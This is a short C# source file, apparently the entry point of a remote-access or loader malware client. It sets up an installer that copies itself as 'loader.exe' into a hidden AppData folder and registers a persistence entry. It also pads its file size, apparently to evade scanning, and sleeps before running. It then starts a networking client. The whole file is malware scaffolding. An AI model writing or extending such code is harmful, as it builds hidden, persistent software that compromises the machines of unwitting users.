using Client.Installation;
using Client.Networking;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    public class Program
    {
        public static void Main()
        {
            new Thread(() =>
            {
                new Installer()
                {
                    EnableInstall = false, 
                    FileName = "loader.exe",
                    DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "foo folder")),
                    DirectoryHidden = true,
                    RegistryName = "loader reg",
                    IncreaseSize = 20, 
                    Sleeping = 1 
                }.Run();
            }).Start();

            StaticClient.InitializeClient();
            Application.Run();
        }
    }
}
